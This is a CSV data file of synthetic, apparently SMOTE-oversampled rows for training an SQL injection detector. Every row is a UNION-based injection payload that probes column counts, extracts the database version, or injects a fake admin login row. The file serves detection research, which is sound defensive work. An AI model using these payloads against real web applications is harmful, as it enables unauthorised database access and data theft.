id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000044,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000113,0.21369494859394092
SMOTE_000045,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000097,0.9736046770089258
SMOTE_000046,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,0.21510681892841804
SMOTE_000047,attack,union,"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",nearest_attack_euclidean,R000205,1.2823497759919786
SMOTE_000048,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000082,0.6569369228943942
SMOTE_000049,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000078,0.5403050875477844
SMOTE_000050,attack,union," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",nearest_attack_euclidean,R000035,1.1227845893639135
SMOTE_000051,attack,union," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000027,0.2943938291910448
SMOTE_000052,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000036,1.1616642079534032
SMOTE_000053,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000138,0.0046446188036563425
SMOTE_000054,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,0.055582660724697884
SMOTE_000055,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000221,0.06164220044619136
SMOTE_000056,attack,union,"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",nearest_attack_euclidean,R000256,0.36879841155239845
SMOTE_000057,attack,union,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",nearest_attack_euclidean,R000135,0.06788910823156696
SMOTE_000058,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000014,0.4089023585101859
SMOTE_000059,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000306,1.1352998909843783
SMOTE_000060,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000181,0.3059858316685059
SMOTE_000061,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000108,0.350149775359884
SMOTE_000062,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000043,0.04242745199605189
SMOTE_000063,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000269,0.011668513788373405
SMOTE_000064,attack,union," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000028,0.0022305469140812876
SMOTE_000065,attack,union,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",nearest_attack_euclidean,R000196,0.2460797856596342
SMOTE_000066,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,0.09145232747417854
SMOTE_000067,attack,union,"1""  )   as hymr where 5497  =  5497 union all select null,null,null,null--",nearest_attack_euclidean,R000260,0.6183192268363101
SMOTE_000068,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000130,0.6406838335843208
SMOTE_000069,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000065,4.046924964496989
SMOTE_000070,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000183,1.1690614440467844
SMOTE_000071,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000016,0.44699037486714144
SMOTE_000072,attack,union,1'||  (  select 'ptkj' from dual where 6263  =  6263 union all select null--,nearest_attack_euclidean,R000172,2.3415002519910724
SMOTE_000073,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000036,0.7643986051275075
SMOTE_000074,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000026,0.5073362263532722
SMOTE_000075,attack,union,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",nearest_attack_euclidean,R000063,0.6605192812758973
SMOTE_000076,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000008,1.0717313616984976
SMOTE_000077,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000030,0.08032558845170039
SMOTE_000078,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000071,0.08991746678512437
SMOTE_000079,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000167,0.36468749531514894
SMOTE_000080,attack,union,"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000223,1.072454621710488
SMOTE_000081,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000231,0.20844492308148266
SMOTE_000082,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000269,0.05776950216989109
SMOTE_000083,attack,union,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",nearest_attack_euclidean,R000196,0.24778592344754913
SMOTE_000084,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R000247,0.20318356116130284
SMOTE_000085,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,0.39198026437621036
SMOTE_000086,attack,union,"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",nearest_attack_euclidean,R000252,0.642614032163945
SMOTE_000087,attack,union," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",nearest_attack_euclidean,R000042,3.332006268787679
SMOTE_000088,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000059,1.0387797838376194
SMOTE_000089,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000244,0.5454230956234403
SMOTE_000090,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000025,0.2530707926272279
SMOTE_000091,attack,union,"-9937'   )    )    union all select 3900,3900,3900,3900,3900,3900,3900,3900,3900#",nearest_attack_euclidean,R000246,0.7870430894048461
SMOTE_000092,attack,union," select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000047,0.4594536338665495
SMOTE_000093,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000139,0.444099485744035
SMOTE_000094,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000238,0.6782238059263725
SMOTE_000095,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000232,1.356059061223151
SMOTE_000096,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000123,0.11622380242773209
SMOTE_000097,attack,union,"-5066'   )    )    union all select 9689,9689,9689,9689#",nearest_attack_euclidean,R000272,0.6055689832289913
SMOTE_000098,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000005,6.424088269754525
SMOTE_000099,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000261,0.8962492833678001
SMOTE_000100,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000068,0.48720633730125007
SMOTE_000101,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,0.10103623617450928
SMOTE_000102,attack,union,"1 where 1326  =  1326 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000168,0.8971422381682581
SMOTE_000103,attack,union," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000002,0.6885416587266373
SMOTE_000104,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000197,0.19779899296812528
SMOTE_000105,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000026,1.7103985301932045
SMOTE_000106,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000184,1.1352846688857072
SMOTE_000107,attack,union,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",nearest_attack_euclidean,R000076,0.5364367635023911
SMOTE_000108,attack,union,"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",nearest_attack_euclidean,R000157,0.5488336645389448
SMOTE_000109,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,2.2474023316827565
SMOTE_000110,attack,union,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",nearest_attack_euclidean,R000091,0.39778822203749076
SMOTE_000111,attack,union,"1""  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000285,0.046971852738096044
SMOTE_000112,attack,union,"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",nearest_attack_euclidean,R000220,0.5473657405731143
SMOTE_000113,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000240,1.2596364915079445
SMOTE_000114,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000161,0.17551384010311633
SMOTE_000115,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000115,0.9665281346918931
SMOTE_000116,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000084,1.4134173383417672
SMOTE_000117,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000244,0.0314282905737911
SMOTE_000118,attack,union," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000015,0.6822547736857534
SMOTE_000119,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000219,1.2188129620880106
SMOTE_000120,attack,union,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",nearest_attack_euclidean,R000308,0.22943980030355776
SMOTE_000121,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000036,1.0131509958018454
SMOTE_000122,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000141,0.020409965041867803
SMOTE_000123,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.2637269416702224
SMOTE_000124,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000129,0.6358483123956649
SMOTE_000125,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000067,0.03093065153800299
SMOTE_000126,attack,union," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000028,0.14716813470545367
SMOTE_000127,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.3439701435163183
SMOTE_000128,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.011768651384892624
SMOTE_000129,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000079,0.31261687532722965
SMOTE_000130,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,1.3241335042874631
SMOTE_000131,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000243,0.3656971756629016
SMOTE_000132,attack,union,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",nearest_attack_euclidean,R000072,0.38787011836289903
SMOTE_000133,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,0.2056919226248964
SMOTE_000134,attack,union,"1""   )    )    union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000198,0.9487597221736532
SMOTE_000135,attack,union,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",nearest_attack_euclidean,R000065,0.22124590451085116
SMOTE_000136,attack,union,"-2500'   )    )     )   union all select 6853,6853,6853,6853--",nearest_attack_euclidean,R000296,0.19771659768700725
SMOTE_000137,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000081,0.9004434823000234
SMOTE_000138,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000067,0.4813309185895945
SMOTE_000139,attack,union,"-5617  )   where 2132  =  2132 union all select 2132,2132,2132,2132#",nearest_attack_euclidean,R000258,0.15233199684650034
SMOTE_000140,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000299,0.16672990544910524
SMOTE_000141,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000134,0.25297098416346847
SMOTE_000142,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000146,0.5497932421194918
SMOTE_000143,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000115,0.5362044324404416
SMOTE_000144,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000069,0.00024290827077358233
SMOTE_000145,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000237,0.16984212025833462
SMOTE_000146,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000295,0.21619447224543176
SMOTE_000147,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000008,0.22958028787226364
SMOTE_000148,attack,union," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000037,10.401393336864622
SMOTE_000149,attack,union,"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",nearest_attack_euclidean,R000283,0.7399853566763603
SMOTE_000150,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000255,0.5281833217167922
SMOTE_000151,attack,union,"1"" union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000311,0.08352173251187875
SMOTE_000152,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000036,0.07254678720150937
SMOTE_000153,attack,union,"1"" where 4684  =  4684 union all select null,null,null,null#",nearest_attack_euclidean,R000210,0.763746156793269
SMOTE_000154,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,1.2993123838413894
SMOTE_000155,attack,union,1'  )   as zmvn where 2887  =  2887 union all select null--,nearest_attack_euclidean,R000257,0.6365192584498452
SMOTE_000156,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000212,0.35528331080455633
SMOTE_000157,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R000126,0.5277360630854001
SMOTE_000158,attack,union,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",nearest_attack_euclidean,R000136,0.538113693496418
SMOTE_000159,attack,union,"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",nearest_attack_euclidean,R000205,0.767524815427615
SMOTE_000160,attack,union,"1""   )    )     )   union all select null,null,null,null--",nearest_attack_euclidean,R000177,0.1658511859483133
SMOTE_000161,attack,union,"-7744""   )    )     )   union all select 9408,9408,9408,9408--",nearest_attack_euclidean,R000125,0.8036998137942798
SMOTE_000162,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,0.4374918081247639
SMOTE_000163,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000299,0.13581506910103788
SMOTE_000164,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000286,0.3512917548370486
SMOTE_000165,attack,union,"-8699""  )   union all select 8645,8645,8645,8645,8645,8645--",nearest_attack_euclidean,R000268,0.4599496632994282
SMOTE_000166,attack,union,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",nearest_attack_euclidean,R000068,0.9419974321762402
SMOTE_000167,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000103,0.5374924710450211
SMOTE_000168,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,0.0979716457467001
SMOTE_000169,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000024,0.03226923615294578
SMOTE_000170,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000067,0.6495589846190113
SMOTE_000171,attack,union,"-3116""   )    )     )   union all select 4600,4600,4600,4600--",nearest_attack_euclidean,R000239,0.045644913445697544
SMOTE_000172,attack,union,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",nearest_attack_euclidean,R000092,0.4171443211414541
SMOTE_000173,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,0.39307887048026824
SMOTE_000174,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000142,0.008485062755272187
SMOTE_000175,attack,union,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#",nearest_attack_euclidean,R000173,0.10526591149865254
SMOTE_000176,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000077,1.2408833867736995
SMOTE_000177,attack,union,"1%""   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000161,0.24771007022362143
SMOTE_000178,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000014,0.03202699061150731
SMOTE_000179,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000240,0.6123762997983494
SMOTE_000180,attack,union,"1%""  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000293,0.05430252266588663
SMOTE_000181,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R000126,0.08349384905337401
SMOTE_000182,attack,union,"1'   )    )    as xuab where 4369  =  4369 union all select null,null,null--",nearest_attack_euclidean,R000237,0.6793363154713272
SMOTE_000183,attack,union,"-4121%""  )   union all select 2659,2659,2659,2659,2659,2659,2659,2659--",nearest_attack_euclidean,R000236,0.19328620082957496
SMOTE_000184,attack,union,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",nearest_attack_euclidean,R000119,0.6293578528243433
SMOTE_000185,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000261,0.7884888678431794
SMOTE_000186,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000222,0.46826980296455956
SMOTE_000187,attack,union," select * from users where id  =  '1' or \.<$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000045,0.6074660424337247
SMOTE_000188,attack,union,"1%""   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000057,0.06196712067841993
SMOTE_000189,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000221,0.27079842830146483
SMOTE_000190,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000012,0.25903911568255716
SMOTE_000191,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000099,0.0072085212577501345
SMOTE_000192,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000121,0.03591631690641408
SMOTE_000193,attack,union,"-1059""  )   union all select 1276,1276,1276,1276,1276,1276,1276,1276#",nearest_attack_euclidean,R000279,1.138332657280341
SMOTE_000194,attack,union,"1%"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000280,0.4074880468087706
SMOTE_000195,attack,union,"-8419  )   where 8692  =  8692 union all select 8692,8692,8692--",nearest_attack_euclidean,R000197,0.8113430600810293
SMOTE_000196,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000097,0.1574528971070833
